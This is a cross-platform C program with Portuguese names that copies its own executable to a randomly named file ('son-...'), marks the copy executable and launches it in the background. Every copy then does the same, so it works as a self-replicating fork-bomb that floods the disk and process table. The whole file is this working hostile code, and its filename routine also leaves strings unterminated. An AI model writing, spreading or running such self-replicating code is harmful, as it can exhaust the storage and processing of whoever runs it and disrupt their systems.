#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stdint.h>

#ifdef _WIN32
    #include <windows.h>
    #include <process.h>
    #define SLEEP_MS(x) Sleep(x)
    #define FILE_PERMISSION _S_IREAD | _S_IWRITE
#else
    #include <unistd.h>
    #include <pthread.h>
    #include <sys/stat.h>
    #define SLEEP_MS(x) usleep(x * 1000)
    #define FILE_PERMISSION S_IRUSR | S_IWUSR | S_IXUSR
#endif

#define END_SUCCESS_CODE 0

char * createStr(){
    char * str;
    int8_t len = 5;
    str = (char *)malloc(sizeof(char) * len);
    strcpy(str, "son-");

    int8_t tam = (rand() % 3) + 1;
    str = (char *)realloc(str, sizeof(char) * (len + tam) );
    for(int8_t i = 0; i < tam; i ++){
        char c = (char) ( rand() % 10 + 48);
        str[len - 1] = c;
        len ++;
    }
    tam = (rand() % 3) + 1;
    str = (char *)realloc(str, sizeof(char) * (len + tam) );
    for(int8_t i = 0; i < tam; i ++){
        char c = (char) ( rand() % 26 + 97);
        str[len - 1] = c;
        len ++;
    }

    return str;

}
char * fileName(){
    FILE * fl;
    char * str = createStr();
    fl = fopen(str, "r");

    while(fl != NULL){ // o arquivo existe
        fclose(fl);
        str = createStr();
        fl = fopen(str, "r");
    }

    return str;
}

#ifdef _WIN32
unsigned __stdcall reproduzir(void * arg){
#else
void * reproduzir(void * arg){
#endif
    char *file = (char *)arg;
    char * name = fileName();

    FILE * me = fopen(file, "rb");
    FILE * rep = fopen(name, "wb");

    char c = ' ';
    while(! feof(me)){
        fread(&c, sizeof(char), 1, me);
        fwrite(&c, sizeof(char), 1, rep);
    }

    fclose(me);
    fclose(rep);

    #ifndef _WIN32
    chmod(name, FILE_PERMISSION);
    #endif

    char cmd[256];
    
    #ifdef _WIN32 
    strcpy(cmd, name);
    ShellExecute(NULL, "open", cmd, NULL, NULL, SW_SHOWNORMAL);
    #else
    strcpy(cmd, "./");
    strcat(cmd, name);
    strcat(cmd, " &");
    system(cmd);
    #endif

    free(name);

    #ifdef _WIN32
    _endthreadex(0);
    return 0;
    #else
    pthread_exit(NULL);
    #endif
}

int main(int argc, char ** argv){
    srand(time(NULL));

    #ifdef _WIN32
    HANDLE minha_thread;
    #else
    pthread_t minha_thread;
    #endif

    #ifdef _WIN32
    unsigned int tid;
    minha_thread = (HANDLE)_beginthreadex(NULL, 0, reproduzir, (void *)argv[0], 0, &tid);
    if (minha_thread == NULL) {
        fprintf(stderr, "Erro ao criar a thread\n");
        return 1;
    }
    WaitForSingleObject(minha_thread, INFINITE);
    CloseHandle(minha_thread);
    #else
    if (pthread_create(&minha_thread, NULL, reproduzir, (void *)argv[0])){
        fprintf(stderr, "Erro ao criar a thread\n");
        return 1;
    }
    pthread_join(minha_thread, NULL);
    #endif

    return END_SUCCESS_CODE;
}

